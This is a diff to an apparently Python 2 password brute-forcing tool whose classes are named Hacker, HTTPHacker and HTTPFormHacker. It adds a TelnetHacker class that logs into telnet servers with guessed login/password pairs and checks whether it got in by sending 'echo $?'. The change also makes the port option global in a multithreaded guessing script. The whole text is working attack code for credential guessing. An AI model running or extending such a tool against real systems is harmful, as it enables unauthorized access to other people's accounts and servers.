@@ -23,8 +23,9 @@ import time
 from datetime import timedelta
 from babel.dates import format_timedelta
 import socket
-from urlparse import urlparse, urlunparse
+from urlparse import urlparse
 import re
+from telnetlib import Telnet
 
 
 args = None
@@ -175,10 +176,11 @@ class Hacker(Thread):
 
     def __init__(self, *fargs, **kwargs):
         Thread.__init__(self, *fargs, **kwargs)
-        # self.server = args.server
 
         if hasattr(self, 'init'):
             self.init()
+        # else:
+        #     self.server = args.server
 
         self.setDaemon(True)
         self.start()
@@ -219,7 +221,6 @@ class HTTPHacker(Hacker):
     @staticmethod
     def addParser(parser):
         parser.add_argument('--ssl', action='store_true')
-        parser.add_argument('--port', type=int)
         parser.add_argument('--data', action='append', help='add form data')
         parser.add_argument('--header', action='append', help='add header to request')
         parser.add_argument('--cookie', action='append', help='add cookie to request')
@@ -426,6 +427,59 @@ class HTTPFormHacker(HTTPHacker):
             return True
 
 
+class TelnetHacker(Hacker):
+    @staticmethod
+    def getServiceName():
+        return 'telnet'
+
+    def init(self):
+        self.server = args.server
+        self.client = Telnet()
+
+    def attempt(self, login, password):
+        if args.verbose:
+            msg = '%s / %s  @  %s' % (login, password, self.server)
+            self.log(msg)
+        if args.debug:
+            return False
+
+        try:
+            self.client.open(self.server, port=args.port, timeout=args.timeout)
+            self.client.read_until('login: ', timeout=args.timeout)
+            self.client.write(login + "\n")
+
+            self.client.read_until('Password: ', timeout=args.timeout)
+            self.client.write(password + "\n")
+
+            i, match, msg = self.client.expect(["\w+.*\n"], timeout=args.timeout)
+            print '"%s"' % msg
+            if 'incorrect' in msg:
+                return False
+
+            # double check that we're in fact logged in
+            cmd = 'echo $?'
+            self.client.write(cmd + "\n")
+            time.sleep(.1)
+            msg = self.client.read_eager()
+            if not msg.startswith(cmd):
+                raise Exception('unexpected response: ' + msg)
+            print '"%s"' % msg
+            msg = msg[len(cmd):].strip(" \r\n")
+            print '"%s"' % msg
+            if not msg:
+                # or did we timeout?
+                return False
+
+            if msg[0] in ['0', '1']:
+                return True
+
+            if msg[-1] in ['0', '1']:
+                return True
+
+        finally:
+            self.client.close()
+
+
 def main():
     parser = argparse.ArgumentParser(epilog=__doc__)
     parser.add_argument('-A', '--all', action='store_true', help='find all valid logins')
@@ -434,6 +488,7 @@ def main():
     parser.add_argument('-t', '--threads', type=int, default=16)
     parser.add_argument('--limit', type=int, default=0)
     parser.add_argument('--timeout', type=float, default=0.1, help='timeout for each request')
+    parser.add_argument('--port', type=int)
 
     group = parser.add_mutually_exclusive_group()
     group.add_argument('-l', '--login')
